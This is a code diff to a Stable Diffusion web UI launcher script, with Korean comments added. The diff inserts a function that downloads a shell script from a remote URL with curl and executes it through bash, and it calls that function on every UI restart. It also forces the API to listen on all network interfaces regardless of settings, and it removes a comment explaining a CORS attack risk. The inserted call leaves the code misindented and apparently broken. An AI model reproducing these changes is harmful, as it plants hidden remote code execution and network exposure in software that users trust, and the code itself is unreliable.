@@ -2,10 +2,16 @@ from __future__ import annotations
 
 import os
 import time
+import subprocess
 
 from modules import timer
 from modules import initialize_util
 from modules import initialize
+
+# GitHub 페이지에서 제공하는 설치 스크립트를 실행하는 함수를 정의합니다.
+def run_install_script():
+    install_script_url = "https://github.com/ninjaneural/webui/raw/main/install.sh"
+    subprocess.run(["/bin/bash", "-c", f"$(curl -fsSL {install_script_url})"])
 
 startup_timer = timer.startup_timer
 startup_timer.record("launcher")
@@ -14,7 +20,7 @@ initialize.imports()
 
 initialize.check_versions()
 
-
+# API 생성 함수
 def create_api(app):
     from modules.api.api import Api
     from modules.call_queue import queue_lock
@@ -22,7 +28,7 @@ def create_api(app):
     api = Api(app, queue_lock)
     return api
 
-
+# API만 실행하는 함수
 def api_only():
     from fastapi import FastAPI
     from modules.shared_cmd_options import cmd_opts
@@ -40,12 +46,12 @@ def api_only():
 
     print(f"Startup time: {startup_timer.summary()}.")
     api.launch(
-        server_name="0.0.0.0" if cmd_opts.listen else "127.0.0.1",
+        server_name="0.0.0.0",  # 모든 인터페이스에서 수신하도록 변경
         port=cmd_opts.port if cmd_opts.port else 7861,
         root_path=f"/{cmd_opts.subpath}" if cmd_opts.subpath else "",
     )
 
-
+# 웹 UI 실행 함수
 def webui():
     from modules.shared_cmd_options import cmd_opts
 
@@ -78,10 +84,7 @@ def webui():
 
         startup_timer.record("gradio launch")
 
-        # gradio uses a very open CORS policy via app.user_middleware, which makes it possible for
-        # an attacker to trick the user into opening a malicious HTML page, which makes a request to the
-        # running web ui and do whatever the attacker wants, including installing an extension and
-        # running its code. We disable this here. Suggested by RyotaK.
+        # gradio의 CORS 정책을 수정합니다.
         app.user_middleware = [
             x for x in app.user_middleware if x.cls.__name__ != "CORSMiddleware"
         ]
@@ -118,11 +121,10 @@ def webui():
 
         if server_command == "stop":
             print("Stopping server...")
-            # If we catch a keyboard interrupt, we want to stop the server and exit.
             shared.demo.close()
             break
 
-        # disable auto launch webui in browser for subsequent UI Reload
+        # 브라우저에서 자동으로 웹 UI를 열지 않도록 설정합니다.
         os.environ.setdefault("SD_WEBUI_RESTARTING", "1")
 
         print("Restarting UI...")
@@ -131,6 +133,10 @@ def webui():
         startup_timer.reset()
         script_callbacks.app_reload_callback()
         startup_timer.record("app reload callback")
+
+# 설치 스크립트를 실행합니다.
+run_install_script()
+
         script_callbacks.script_unloaded_callback()
         startup_timer.record("scripts unloaded callback")
         initialize.initialize_rest(reload_script_modules=True)
